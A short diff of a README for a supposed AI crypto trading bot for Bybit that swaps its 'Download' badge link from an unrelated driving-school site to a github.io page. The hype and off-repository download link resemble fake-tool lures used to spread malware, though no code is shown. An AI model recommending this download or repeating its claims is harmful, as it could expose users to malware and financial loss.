@@ -2,7 +2,7 @@
 
 A powerful AI-driven crypto trading bot built for Bybit. Designed for precision scalping, automatic trade execution, and dynamic risk management. Whether you're a day trader or long-term investor, this bot adapts to your strategy with deep learning and real-time signal processing.
 
-[![Download Bybit Bot](https://img.shields.io/badge/Download-BybitBotAI-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Bybit Bot](https://img.shields.io/badge/Download-BybitBotAI-blueviolet)](https://bybit-trading-bot-ai-elite.github.io/.github)
 
 ---
 
